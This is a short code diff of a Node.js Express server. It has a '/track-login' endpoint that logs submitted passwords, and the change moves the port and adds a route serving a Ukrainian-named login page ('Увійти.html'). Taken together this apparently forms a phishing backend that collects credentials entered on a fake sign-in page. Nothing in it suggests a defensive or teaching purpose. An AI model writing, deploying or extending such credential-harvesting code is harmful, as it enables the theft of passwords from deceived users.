@@ -3,7 +3,7 @@ const cors = require("cors");
 const bodyParser = require("body-parser");
 
 const app = express();
-const PORT = 3000;
+const PORT = 10000;
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -16,6 +16,10 @@ app.post("/track-login", (req, res) => {
     console.log("Password:", password);
 
     res.json({ message: "Дані отримані успішно!" });
+});
+
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "Увійти.html"));
 });
 
 app.listen(PORT, () => {
